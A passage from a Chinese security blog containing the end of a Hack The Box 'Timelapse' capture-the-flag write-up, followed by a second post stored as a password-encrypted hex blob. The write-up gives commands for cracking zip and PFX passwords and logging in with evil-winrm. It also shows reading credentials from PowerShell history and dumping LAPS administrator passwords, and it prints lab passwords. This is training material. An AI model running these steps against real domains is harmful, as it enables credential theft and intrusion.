<p>PFX 文件是一种用于存储和传输加密的数字证书的文件格式。它通常包含了证书、私钥和可选的证书链，所有这些内容都被加密并存储在一个文件中。PFX 文件通常使用密码进行保护，以确保只有授权的用户可以访问其中的私钥和证书。</p>
</blockquote>
<p>先用john看看能不能爆破zip密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip2john winrm_backup.zip &gt; ziphash</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409002050.png" ></p>
<p>拿到密码解压，成功拿到pfx文件，需要从里面导出密钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out pfx.key</span><br></pre></td></tr></table></figure>

<p>也需要密码，再用john爆破(发现john不能用root运行，我还以为哪里出错了。。。)</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409002849.png" ></p>
<p>拿到密码继续到处key</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out pfx.key</span><br><span class="line"># -nocerts 选项告诉 OpenSSL 不要提取证书，只提取私钥。</span><br><span class="line"># pfx.key 是输出私钥的文件名。</span><br><span class="line">openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out pfx.crt</span><br><span class="line"># -clcerts 选项告诉 OpenSSL 只提取客户端证书（不包括中间证书），如果 PFX 文件中包含中间证书链，则中间证书将不会被提取。</span><br><span class="line"># -nokeys 选项告诉 OpenSSL 不要提取私钥。</span><br><span class="line"># pfx.crt 是输出证书的文件名。</span><br></pre></td></tr></table></figure>

<p>还提示要给key文件设置密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409003016.png" ></p>
<p>然后拿这两个文件用evil-winrm连接到主机，输入的密码是刚刚自己设置的那个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.152 -S -c pfx.crt -k pfx.key</span><br></pre></td></tr></table></figure>

<p>cd到C:\Users\legacyy\desktop，拿到user.txt</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>查看powershell历史命令记录文件</p>
<blockquote>
<p>这个在应急响应中，检查windows主机，可以查看一下这个目录。</p>
<p>C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine</p>
</blockquote>
<p>里面有ConsoleHost_history.txt文件，拿到一个新的账号密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2000.37.50.png" ></p>
<p>再用evil-winrm登陆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.152 -u svc_deploy -p E3R$Q62^12p7PLlC%KWaxuaV -S</span><br></pre></td></tr></table></figure>

<p><code>-S</code>: 启用安全模式，使用 SSL 加密连接。这意味着连接将通过 HTTPS 加密进行，提供更安全的通信。</p>
<p>没有-S失败了好几次。。。</p>
<p>使用net user svc_deploy</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2000.52.07.png"   style="zoom:50%;" >

<blockquote>
<p>“Local Administrator Password Solution” (LAPS) is used to manage local account passwords of</p>
<p>Active Directory computers. </p>
</blockquote>
<p>LAPS_Readers这个分组说明 svc_deploy 有权从 LAPS进行读取</p>
<p>使用laps.py脚本导出域账号密码，需要绑定域名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/n00py/LAPSDumper</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409005529.png" ></p>
<p>成功拿到管理员密码，evil-winrm登陆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -i timelapse.htb -S -u Administrator -p &#x27;[ej6W8oU!8b;V3&#125;0obNE[!&#123;#&#x27;</span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409005712.png" ></p>
<h5 id="读取密码的第二种方式"><a href="#读取密码的第二种方式" class="headerlink" title="读取密码的第二种方式"></a>读取密码的第二种方式</h5><p>使用这个命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-ADComputer DC01 -property &#x27;ms-mcs-admpwd&#x27;</span><br></pre></td></tr></table></figure>

<p><code>Get-ADComputer</code> 是一个 PowerShell cmdlet，用于获取 Active Directory 中计算机对象的信息。<code>-property &#39;ms-mcs-admpwd&#39;</code> 参数指定要返回的属性，其中 <code>&#39;ms-mcs-admpwd&#39;</code> 是计算机对象属性的名称。</p>
<p>这个命令的作用是获取名为 “DC01” 的计算机对象的 “ms-mcs-admpwd” 属性的值。这个属性通常用于存储 LAPS（Local Administrator Password Solution）生成的本地管理员账户的密码。 LAPS 是一种 Microsoft 提供的工具，用于管理 Windows 计算机的本地管理员密码，并确保每台计算机上的密码是唯一且定期更改的。</p>
<p>执行这个命令后，你将得到名为 “DC01” 的计算机对象的 “ms-mcs-admpwd” 属性的值，即本地管理员密码。</p>
<p>（来自ai的解释）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2000.58.57.png" ></p>
<p>也能读到密码</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>整体思路：CrackMapExec发现smb有共享资源–&gt;拿到压缩包–&gt;一系列爆破解密登陆第一个账户–&gt;历史命令文件中发现另一个账户账号密码–&gt;发现LAPS读取权限–&gt;管理员密码读取</p>
<p>涉及知识点：pfx文件，smbclient拿到共享资源，windows历史命令文件位置，LAPS服务</p>
<p>思路不算难，写完复盘也是对windows多了解了一些🙋‍♀️</p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>htb</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>htb-UnderPass笔记</title>
    <url>/2024/12/25/htb-UnderPass%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="31069613ed6f56c2977732cedfad45ca543de974e39e7d7df8521fea0484cc6d">948d3a4d19e8bce16b53ccf2f5ad6f1a0f2e318246b5c9ffb29f08d8de963c3128ac0d24321fe12471a5692693c3f5bf67c044f5c9b98bc039859b4b3b300b499df5cee64dc7e791f876297512b999f508381f3a96109ecb36b39c0e0daf9b8aafacf6dbc5afdf9f1b4e3bea0e86c7375283c8db7b7cbf6f5d8259894c809672d9052c09f106a00a07defe9acf03b439f513124fe2ac0f2f84e2539ad01ad426c5d561a505184c21753e8971d360280efa27c06567d3e52f3229381127a21c5ef0617cc5f5c671d4d5620131a6f1fe5b220fcea54321c572f657bbadbadf180a40bebc9e91430f5a161c46796d7286414f9ef11be1bd3cb96ef95751b2d9a6411acd11712995447e61ced4035ab9c02296e115b126be567c8d01932cf6d0fec8790bcbc87345bdba4cf14f240fdfd86f2f4eafdf2b9d7c29faf52364cb5989b4ebe626f3c48601980f30b3d6fb8ca650df8922a21cddb5c5b2a9039d87ef995ab05552335d3a95ff12e30661fb45a3b6d2a105b1dda55d8160873cef754d5a2451ba63bd52ec5b81ad719cbb0e0bd6e91c2f3c7a2a1d045101243f7203ee058ff7a38d99c4bcc191d5c66ccfbacae82bee503ec73fe6f41198ac064bb2622197946c964562eb4428718cde0136f821af285c1aaf8cb4ce0efbbaea731fe9b3cd3fa6d275eb2778a9e1b3f304b4c230baf786c025257dfb8480a52dbc85e96f9cdf3f995815609be137075a457406dfa19917eb59d57d7cc5070f7637c3c3c3d292528ba770e8cb9a8a4610be8b506dc8822f0c9d15cbab470dc23843233d62b9f89f509096d9b8fefadf730232db477f33e8e70c0e386ea8c02cde52bedd2c69c2bbceb2c624baa7df3f779a7632738260038ab92a04ace878cb3b232c2cc31841afc9adc78ef8b3385f1d39a875201b4ebd797912a19df295b97ce2092dcbfad58be5a4348a35415ef845aaa3593f89439ab50ffaf94123be044c93f235109e0a537ec2c050b203ea6aa1d4e35d16d4da7f85876aba65a7cb7434b116892b8875df60d78d3d38e90e2a1e443b4720cad5344288c74beee4fc822b6cd216455ad28f9fd337f6f86f8fe0a66a0725ca231f584d5747a844fb601c2eb5793356f2569cad70a1d62b89b705b0354b919f86a660a2ff5ae37e76ed4894384c04aafd753a63178ac3e4928229b79fe858aeee931d36f272d458d4de9fb00f6dc72da11f870c83580f09efb7243bb6b0cc9b236cc3482476fa0334352011a08fb67d1790e930974e10cdd6b3cbec65b86e1379aa52aab37f5e1c9d46ea2ce8f9f373a99fe9bc97c59d898914452848d60cefd750ec24933725e2f949c22b8acb893e3f8b60ad32d515ef68b3a80493f1669d0e14bace118ac63830fc38b889dd5c726cd5f308c8994c863a901a051334068e5a2659d0f9693f2196c7a81fad86db953c08d29ebeb1b0ab4b4b50f48d8c5987cc2aa33806dc06b2a095df17a2a5822a35503a58e472308383fdd3cedc460378def1892fdc17bd74958ef3f2d2a53fd0dda500561a0c754d64c7ea1f4239204d9c86fa22c26c88e23441690dad2499cfe577fa01e1a18de25c73fcdb8c6fb374ce07e0239ed371b3aac9b4551774591e435c75e49230f148a92ce62e71712a466ad037b9221c66cb4a45acf1f15edd11d3f4ad3d961452720529affba56d0e93b0d5d3d039116c0ff60d193c9761af451074118f1c97d087cd731e94ddf0beb436419f4c66493bbf1ab85d6c28f1fe2624d778eb871f6546054abded91f253c57b036bd2cb749e7b3ca4d91c0733e83dbb6369c9f3aa22223dcad0df9107a3b12141c5d16d601c996f99a39c0455c4f8fc847ce0d8dc95e4b880b7d9cf61dd3bc132b432f2fa68b8fae90116101a4e9a9fd42050fbf72d1fd6970a37a16ce2e548ca516b7843d314cfd26d61c0c862e7a6ad517f127503a32c976b6e685c394ffe501ada2052ad86c56d11386c7e8222feac5bf5103ca7fd84c9aa0c6277b51f1640f0fa524c3d71fff9f052c549d2a16c3e03cfbb25840c2f007d6c923f013b474ae09d0b293a403f85e73c28236a749c2a31d6ceb3d646eabb4f8b85cbd11756df1ee76d2066457a4edd61e22e493fb2f5d0fe5f505397773d642e3da91ba080e5cdb25c422093f15197964e4bcdc8fa9ab5457f77dab69f3382c23044b21b9c96c91f17c08bea84dd3117662fa61f4179ac3cdbdadbdc30fecd59fd7485fbb810b9fc4b4d76d5f721bf1301dd7be51d37d2a592705484584fb2b81ebdcc9a4cb149111ad56226ab91df4fcc705807ea051c60fd1fb05242b0426d8cd7090263ee1ad20f94150a84f9830608cb774651152f4aa58d50ca8b3b337bfb51e499e678391111a60789a8d65222253ceea5d1ef31486d97ef24ff252df24d9284c48dc97257a983377be325dfc2b9cb331c4e3e3c6a6c6a7ce039ab25f8e1daf36fa5fcfc88bc2c542f945938339bef257709a93916b7dc6280a2063f9ebf639737d0e1f8131d92c71e119e72fff39890dce150de33674759f91aecbcd04f9e1e61f5843e8aab8a07ae40973c339a800b269a3b7005c1a545f6fde93a69a9c5ee4e7c24035850631ada535af930a751c4e6ce2695df98bc8b07311ca16f51c02a159a41d3f48caa406f1aaca83430e0dd719e4de3257d2601a89a0fbbccaf7ee6861a6ade633543d17bab6fd03f326bdb28d993d20f8155f3680305433ef3aef4bca012f57efc4ff6beec51bf6c4cf6f2f93d837734fec4df62bd2ae92463f7d94aed0ac082ef6f5e72a98acde481cc546314d704acad554ce636891fa2915669413fa0b528e13a1f4dd5a991b974efad2bebbf193850b9efa35235a84bea8426e517b1ea399512674d6adfcde667f0602cd87f6134e30033d71057e4f9e8a8a094aad27d694b65c45491e0ccc7b6d95b3cfa2c32d96b8dbe6e4e565ac8ede6e83f5ac573c83ac91fdb901068c73958ac9f7996c1af4a10d3528746563aeda08f09847b7f4151f98a83edfccd96433250a8ff9a4f654ce9487656d2550c1d7cdc959b1ecb050d93c84a3d876b26f98e8e9a853a71d333ec8609b024f81cc370efd973b097649ff3fac96f8f079047bec4a56cca244a85171dda4b7dea075b8ff7dbe0ebdfd087249eb65b537dfad674985fb3e43aebd72fbd124660784873f8fdef92b2ca842c5a6f5b7faa6452951fb13586d0b269a3275333355698ff53645ca2151b12710c2dc716741d49054da2734d79a98fc541368d7a256db370d8a9297a78a7f531a4d6373d3e29f5e0b47b05f019bcbb56d3b57d00c9efc36e0e31ee4be6662fe0d82eeb9f461abe2051ab0a196b982c572c03d5a2a7742b08f3194a64cc97179089ad1513b2785ace21781d8a0806cd3c30fa999440b90cfbfbad0e600e7215d2e57baff8a0622b38a6b3682d4f198514fad5c8bb37bc43ba5210511674fddc6312d23b8777ec2d6a3f8093ec486bdb62bbb0e0aee3d807765496ef81987d1e1622980bee0269305e411b32f8104046967708c2eb59e24ba70aaa7b1069746c13ef4352d257ccb472ee2a59baaf51e96e25eebafbc6882588b50417039eca1863273e7f47fdd1eaa0f5730d644e71bdb912008e6b4380fff36cf222fb405ac397e069df8b04e915afeccedd52d1fe57f085adde084eb22a7095e600c0d793116b8ece27345ff85f708bf7d5098fe4bd438ac477c420a8093db8d94bbf3588f001200ebf0d7a66372e1fad405ede1bf150c1cc3acbddf8625a0e32398b02506638cea2321cc2c6f3bbcde8cf109653078cb5c2ea130ebef26c7957f822e14a9cded267ddc32ad130c2fd76829dd061b512a60fe154683c7f39e728541789be82dbd6ab16a6da686a06e5fd28023e5bafdf024baea8e13275c982315b716010932e0765f84953d8fcec327cf9cf079851e56740b65a215f07c9a725096f580acd4c7c527950c03713eb492a7ca99cb1a51a1820109dfd72fb3d749c665804551dbeadcb0c924efab9c4061077834c10b0ee8cc29d041587b7fbc81b00c2d5396d34c1b83a40f08f1082b47af2ca1a229524a3209d55318dd1d762229fdf0f02b3143c8710deb2323daa07247ee4ee14e55505d897d989f8080d7d2d206deba002e141a22ace5050cda50b0f81714b547549e968c103b11bcc54c5347ee6fa2986615078cec4f124c04db036b4be7f97883e5034aa5dead5d189a99551da397cd710e613192a09c88654e0ae2803b17ac97ca895c270ce28c84945cf5d73369ce291d16da01152f3092ef751780b728e31834cf6bf4e07160067ccfaf9f16899ef662ecd5c4639df6b350f05f4ac9a5b0ee1e53265299cb1f3b5065b97a63761c2f721d9abfbe1955fb2d003b2dad07e1d120be632d717168c614eda4ef67989b77706dc10dc843c03ac81cc5b838ca9b59d9febc18b4020f679651cc8bbaf4a4740b501272011a950816a155c73a0ac6a7da6a668601fb1e38e6235a671215c951258849d115d2bd40e29eb9b650cb72145d974147aaea7bc68f45e1c64e9a16941e9639cbc2fd5ffe6fa07af254c892b042ba94da7c6266b110c17a2cb7b1973d5a81ce617e161996db1b29bd4bdd463eb1d887f4ea1d56a6df253cad872d672c3378b1c32aa7bdc3f7b9d2eb5bc2db0d6d195d98e54c963e05d0a8c0398b7d484c3ee82361245e1cbe1b49faf32fc23680729b63349394447102a67d3a2195b04aefaaa961152c95a67ee40be425765406e205b68c06171df7019fa6587be1bf9365e9fa301278d573f9bbf3e14e0990f3646402d2bc25b6be5261ed0af43b9fd54ae179b8d351bfa7b79cc95bf9c023a518a73bd44d9a1c38c679e0296978a2b68497ea91cefa679e80a6cf0931e85fc085eb8e005e0f6e60fea25a407aa22d652651d2faa235036b6305ddadcb1dc3405ee63ee1db90a79e762e878d5fe91f7c301e046e992ba2883a1e3e6cf304293464cd31b3d5191d434564a146aa50cb908b8af86ab4fb700ec6662dda5ebd3bb3bcc38429410719f85bb71d6779c244435d686cbe038f27d4f6e551d9e4daa474f7bfc8f9762cb84cc364aba50872b3838f6ea3360c63c1775fdcb3110278dc6aa187719175a6136d26e90c2a05edf0312b704a22e9840ef7ae69a346d5424439912dbfb0201205291feb65c8c6faab9782c196e9ae94d0c399c35caa2f738c8865ee7c4c5fcd39f407825535eb06911181dbb75eb8474e6f5e89f5b0e76696aa8ed1ab5e6b952f9d30389c1c3e3c8111c144b83bbfdef5cc0fe34c59c16d5d3429902aa74ee9f998287383c817e47b9869bb98814eb28eb9d0b2a08a1d1074f4a7d1e4b5ed5afd6f64e91c419f2719ccf48540fb8321556f2bbe94a2cde587eab1afa03226ad5a6be6131a9eeab91524782921425cebd47d9f8beb0927cdc3b195384836d787484035fd8ad56ee42b3d3304379f905fa19252c01d5a2786721e43da3a846ab973008bd87d552af878c95cc3d77f386db43f954e766c50541b7246bfdd57316b99a2285e29db6834c00697badd80c34a4aeb069655a45f4a0f625d73948028122cfa60e4c442ebe05dc4183c68cedc1677ddb3727aadec65ec573a97e6d42680cc4c4922a5256be1f876062e52c0c21f5084b673f7497033ca7fbb7dc64b16457e52b7f935db7bd345eff71f883ab579d1e8e3c2df896a4f05c5e4c018bf7f8f7041eaf6314650ff85891c51eaf081a6837c28f9fa52ea8c4da073a03feab4a7ddbdb2b2e72f4c675207fbe7b66dd7cc28234333b467f40e470f351c5f1ba3ebd5a27fb569f586260cdc6b53ddc7f644700c505b9e5307390dc6a35e995a010e39d4ac2fe9ff5400de22eff7c3edb0afa46f48ad96f511403a44230ed39a90267f71d483782cf06bbf570595fb00af8f2a9ac58f4c9b8e2058033156d7b36e7ca9c95ba3bc2bb4e7043e6af0e41909d0d2d12d297a40ed48d7a8535af2df9fa481563c868ee137e77bde47712f9e4924e679107cd9d08d30bd04d94f2e5b3bbe317c80a89c9fb279f69a59cd1406623dec744666359d72315f936cb8ad60b0d709abe2721a72686d0eac4e55879d9e0c5d0e5afca13cab248129b0cc4552f27eb51f4bd93d9d93136f46e33db2ff77d00cb6dbe99cfcf87ca484f79d84299413eb8e094954655fb61c8d6c08059243868e78a6fd17aa826b465f01c6aecc24f17c4a678d427f81d8b1a290851ede413197ac3d38bccd1dfa33b5fcc35eb0a1099af9c9b6200ec1ed4676fa988b3734eab756df241e4c4a7f4ce8721eae83e3ce32a5c4e754f5b24754846557261682adfd364b35e9c0a3391d4388164bf5e8a320cb3e0cba5ffcf70e9b5a3b8b6b2a18057e2a97ed92c4f0c4891245682c93d67ff6fcbeeb55e7f69f3a51ab6fd71b69a68502ac611c244e28ca811298cd23cb9a06615582da3d9656af2e55df97fe4e8ee512e7741888460659a787f828dddce1365fa306b7132fab63fd16199d252b53f95c4536bc2f0943fcc29870fd630a24df4ec0c991eb4da80b9974e148c5291eeaffc97a62784b47cbf465952949c4b1b5697d9fa88ca22071a19907d6b686828c30d3d02f54f6ab1f1612c4c2e20259477c1473c0554c6fbbdb2231f0cedb35841c2cac7b6cb00a17c7df554d9470cc1f8625b3df70ee20033702fda3b458d9cb22592043473f1317b01a6af6382e6e3f8ad71cfc935cb863e475c7a29d74e8243db34d2869e8a2a71e193c40530e2b8638f3adc9a523f969baa3929551ef9345a280489486f054960138950d4aeca69637b574419801d3949e077c73a5a80c9bdb96a9eb1ae99b2693f178aa32530ccec5fab0084abcb9cd8031214c36e5be50a3840f6a4b33173cd1203139de466360306e1e83bd078bb0a4b4b56b69a810d0acc99a4e096b5a5bfee514f20bd6a45df0b81bb7ac77f0d43786b0a6c01117fa0483de4434aca530dddb724c3e42d731ca83ecb633b175adb9bbb0dc80715c84a838389b4e7d13cb69a990f7c2d472dd97bd26b1a3c0b7afcaff419ec8612c387fd768bd2beed62dfdb6c55784c421e41646755bd37fb1422cc8e39e34acb636dc03567fd52895c717f3cf1d46889a3c900262d5feedb912f618c7c7db6c580661aab236eb18d7f07982631a591061829b224d29a318ecfbdfd711afe1b81180813ca8e159e6f61e0d7a48f8b7c73ec990fdfa4f818df3a3d5789199ca55e1fe48856c49f081d7ff8fe85d23cd866f605994daa775650e8874d92cd73a110850ad086ca39c69e3faf49070ab07160a85312cba6076185597acc4f1c87c2a000218bf33a03dc114f287d8150f5d40301ba11eaba571630e2f9227430df9410a279b308046f61a85d2dc98a40fd307626fbf24cd6fd2d103e35d06e3399b5ff54db0a1b9abd078aac0990a26651606fc5a28b80056c84a7d384aaae0a134e7037aea14faeda404e9e3a8447ae085336adf60edf7a35aa116bfb3e61555b5347e652d604d37ba413fba469b965f610e0c7939ca46c6ecb97b751cfae37d8a0bdf5dd94a8a329f182b0b056a9c96c477e1f5b996f51bd3eaf54792a2e2971f7d6bf41ffd9064cc09ff4d372a5d5499c5ee7a7a7451e348606ef277eb8719484b95f42ffb5184c822eccc17d59a56bb5856c9d10530f937c7c83f9aa199eee46c98f121990324f9d75415b5bb3a0256dc65b4e70a8a336682221ed643097bb53a7ea6738603aaf17e3ce52baf8a064d035ddc17865caec00ad4b44b9d911aa445fbd931a25fcdded37d766af3c694c8c70e008d3172e8ab2443c87acb5321cb1370ede10d2abd772c71aee6f42db253ab65ade3c052c3e563722b4a2c7f9507fc080157adb940a19ac53fbd53a3f904966d2ac9b4ff7fa19b28bf9bee5de2222f0129abe0f1da04d4dd45cc806fd639d0d627dd38f8842955191e9efd8b9c53fe86e7dac7f8688c10164d4ea117bc7d290270081677fe9659bd5ddabcc9d0f549ab3d59656dbe43addc6b771efc4dd7b6620b6b5eec18d2fde95b62809b51393552ee5d293be00693aa5f3135dfae7a962299b80033080fe6d38d321773fe3af75b53dfd9ce963c0f0569cc53d6ec3542929fb9018e8da13486ba453e71b4ef3aec358b4fa8e37101a6e55168e24ddc9b49773abd135c4e619feaa732f94ef2a954765b6065824ba5306987a029b87128cd3437f272cbdd3744ec3c20b377e66620eded79c2f8f0aeaaa772917fe6a67ae4447735cbe1af4cc7f9d0827cd25bf5a835cf77b0c6edecdeeed65bf5fd802e3f51a93888ba7d938aaf2792d45d36c2e664d4728f8fd66b32407387a613ccd859034498798ad20bdcfecc77d4e93f99ed40b2637091a6f76b22fc34b72c6c00e417675929349591b0c1e5f81117fbb7cdcceae4ed4c41f77947cf8a31f8508f4522d0bff67221396dbcfebdf62924d7f7bac7bf508904c1af05d31ea34547ca6d2881bb47037116e2d74c21008663704ad4c1512b0c441097d254b7d4d0601814707058e7170504be951bffd5eeff278b2a1994cc5fdce31a7bd4f21ba8030c73383be3f90963482316fa91fb6013785ea60471f3352e482695c7bcc83b5369a19152b869e4b5124bc0c7567a77c3570b4730f34e3c3641e7c4b963d9c98ec8baef977b8655b5599addbd31b049d6292b72e609060d393eda3de5de082d8af829a076f3b905f946530f71fec8492fad8296575f2821b8bd62cf98c1bdc8b4c33d1437ebc96b38b0f7720c71cd7c453d31c566f1ac93546abf7fbf31fd868f2b770f7347682fdb6afbe3570d092a8fbb374c2ce95fd0f407f9ece11a77b84139b16658b242b8776f9b48c97124c4feac0238de3b33dda5dfd78dcdf09c022413e0595cd7c2b5df4ad1ede922a441085398e791b28db79993b0df89efd3acf59fff2fc31bd09db5bef507c8a36b6dced53d3e5692e14921ba82b468155f0d9ef0364aaeb481b371e879214643001857dc0327f9047b14344f1cce7a6cc948c3e2847574ad65359111e039cc5d32b9352f983044a515d7ebfd1ae41f106cc51f8ce7fd4d175b11c3075409ce570d2df0a5b147ee9b5618b37dc3d6e73d38f7093d098bb0f2ee77586f1f492089cd51003e3425d36fdba6133846aedc6806854bb67fa09f63cad8a6bc7436e35a96cf2cf792c9ad0a40f3049f15c699342ae20ce623fd38cbb303f692e285b12b099ebb57f92c68a3e9f4fc713e68bb50d470261a630c87a5159480abf22eee74070e6b0a47db23aebbcd54c54ea4413a0bf7b58157dcdd66b39ded2d4459a88e805481a671468ce30760e0e69b89f1d4492bccf0617a666cd3abd365c9133f64eafc216868eedeae576ffbbf581b53c14cf4360fde4b8f6386b684f1a64c56d6575fd80962651451488800a1983420f68c24fa3a4a5ec716639929c68d9b3ecd5d3f8cf53c43d99cfa3cec3c8333be2be18a2bfff15b3a91a734f0d7fdc2425a09c80872fc3dcf5726930b37d2985f82f1cc3eaffd4b63730dc47e63cd295e368a94342878a4d12e685749e0716397c803507596073610abceaecb842e7113695fcd9e026bf46f12abb72de1fb92a42497ce4820e52094d9d9bfce834fbff23a7f480c75701224c9e5838e7641c67a2f53b7b36a6639644718d89a019343c0444abfe9862c3be8c56cf8d6347fb15ff6d748495a9a0802831eda526ea0b8b90bfdbfa1131f745b2c08d3a915efecb51d70f96fd7666498fc31eb007b87675ebe0b732eac4768012d7cba1b2a008d3caad441b14b7e984e3e5d0abfa1d0b3499fc1f82f74e4bd69be69b79ec1f5e5b9cc0a6734334a38e211290f92b10e72c6611f108a44b5647d1051b9ec95b35436755c8bcad60c15894ab1cfa040f4028ba77b10c28494388c15664304911df38164a0705b8ce49c01c6a23ab69a630333fd2d72a0207aaba943188b01fef300856453e13f266f0fa226d71ebb8d554c29ac4a37609914dddfff29fc57726c0df405ee460a1db3374e256b4025319bc71960c21e2ec64f37f88642b6947733a4d161851e1593e6c9d9b2d759b5c85d6642ea6f3b9f5f34845bcc9c1b880fe459f17d4a9bba43aa0a072e922a9c9cc558a70833daf9c98a421af9cfbe1341724661857b08ceece4425d30846c37dcd32e8df4e657020d0338d01441cb96dc45017deb652e5c198d3a2386570f966b050c9a27622fa57b0b6c3ce05319696eb32c1807d89add78ab077ce89654601014dccdc4d281967a97ff5356d1f07c9520ff72064e606fff63a197834deebbab952d0f2824b42656f6937a0f44eecb2ec6fdc05eea1427cb13f99cdd15a8bce6b202c4385243af93ac7679ec11268bc00ebc2dc8615253de41e0ba2b7d34e7d0faab1d60dcc8744eec75e88e373b49c8fa33517c430e00059c39a524138d149567e9371dea50374d6bb646eb013eb42a991af312475fc411143640570774b0c9bcda85d467fb2da46fec5723f7a841c669b4a52375c7e018a626a829be070d8410559089945a395823b9925038a2c9584d43e226e87051ffba416fe68385cedb5ff825b5d27210bea95fd2e7250f4b26b78eb9f37880a7c7ab593f7072694f76e98cc93708632dd266554051d912284d2133078aa7e559b24aa5fda38366a329e8f7ef0037a92f90af58c092f93626db5e6d3ca4b0428a302a37bbf9dff88508af0f8418a75548fc56faa313a64c5973a37ee1401391ae2f3eeb7f536b1652bb098a935b46c0bf04e7de754b5efaecb6747a867ff54c6efd1b0eff929f78e4970a8feeec45b87118113f06b3cd46496c0c35fe973b43f3785b7623a8ca9505a12feb9ceb8027466bb8d511157582c49e347d5362ad88a70540eb3a47c2b304b3d5691db91cd10ac4939b4c4b6734caa309e684105fa3626d983b5e6b5d7903e3ca382e7b0cebced569dad28f5e5287e8808b70a86d6023b278d0e8ecadd06685893327bd2f1199e9b415e90743565277888d180ee9073e470188daf39366f8be34aed8cd11a43adf64d9eb2c1c798221039a9a715ab933e244fec4b744d6b491cceca3d0a1efd4aad175c518501ca6c9288bdc6e72afc67ced176d54da1edd0ba5782485ed0c0e87c080f1772938fb0e1e98bb03748c2a9655f0f3f7d877fa1057bc1cd98fee780fc9231fa38987bd350ff42aca019bad47f526b6494803f29321b55788dce40366ef0074c7ea1b2c113d1826a53ab5e447823d24591c7a9501ecd1119fb0f77ce537bd7acf3bec714fb15c823699ece7583cb10507f564d4f66aabd81fc04728e871b7a85b2de9a6006e18e9a3d8f436ebc0b8df510132d2e37e4ab5b6640112cdbfaa3a5504a92a7308809b60481868b6806ac8e24862dc54dcea783b24541b14ab35d18940259e112b922b0a7f4485b23e0db2ebb40b84fa173b1e1c1900c7771a9093207734ca963bc935753f993f20970242f7d52a40d5aed07c664222cfe1dd198882a031a0c84e73ba104b02ed909720c58716f327eaa3891818ee8e4c97ffb3af319a0cbef74fc1eb9f750a939d7f153aff118d7f2c45c9e739ebd5ffd456d12438792f8fbd5ab965755c90d8c060776ac140c8d57a4411787e6191dbf56e0cde1386f6d74e68781dee5c5eda2c7ac2ba273c10b20b6e5aac1412e88c90cf008a6bd7c9029494dfcf64cdd382c9ff069698b176c74254da991d13f0941db96e701149e05c7285891c52040be7bda3babcaefdab11e1258329be1b0b70351b152c967ba0c5630c52cd4bf39891a8dede5d0018e50900b0e256a16438d8e7386e9cf037172f5a1bb5de4bdf972dfb8e40010f1258a3d081216fab5a6456dd2d81bae2acc592d5221a88776c7be81e7875d1f17136e617ece2c6ac1ec1ff1df297c01f8e37d4182042d4d6c2a44328d604ab3fde720f572226bf7973c9a05b41ec92f56a5527f87c1fd80b94a84a702a9b56710991d4b12fe8695f9d3cd2a21201ac135b9b2baca9bd2dee175f01772e55680d70c3c08678e8e6b442ac374f8b44ccc2477b8b7f0e4c8c72b1164288b4d1bc5d8ced495a843948d6160254e4feeb22291f196828ac066b9c282e33aede405ad6fb411bb09cd5efa5aeeb921bb405b2c342b917b7e5bac69c699ecc571babc8c25b1761ae4d814dadd88376ea1a01079f1c5f4e0d6713f86fea5860cdf92ebbceb6f1a8f864e110794470fc4cd3f984c5e5cbc21998e23371c49a18d2c7779fb37190882bbd9e52db5db7b99ac14455b78772b248c5dc2dbad6ba028ce12a5e1405a1cd382ccb748908c6bc8bbbbe37fcd5311e47d8b680d4dabc5ba99cdefbb90c8fbddf4b05d470242cdb7c2f49127ab6526b08f662503949ad9b6ba35350f74281793b261a0c6e129760ed7d7e241408238578cf68bd9988302d4e7a82d4c5bb9ab1535268ee04f95521b02ac07bb6b145751f43d039d47c8cfd4010ef30d50a8a9c47a28a3bd6fe0b2bb8a021edb5313e65ab9662132905d48c56ab5cecaf29ac52e68d621b7da30412731623332d15c37e5d67592d197d5509acf83bce04bcd6b86cccc4b35a984919131d9ce9b4efc704e1055ad6c5d5d2e3dce6d8e7985476e4ea15ef854545dbb7163be24dd2a0194972a70ab74892b81c8f0e421fd506f6e5dde31fb704c477b52ebc79d4045b2499183b4f6423bed6f511716292a1de0163829e01e7a0e02496d36ec85919f10ddbc75d87b5e841881328c767a0e49b91788260e5c1cdf7bb82ae267a951c628752693da381bda40417c2ff14cf0e64bfe0e6a9022af9eaee3685ff7ba2273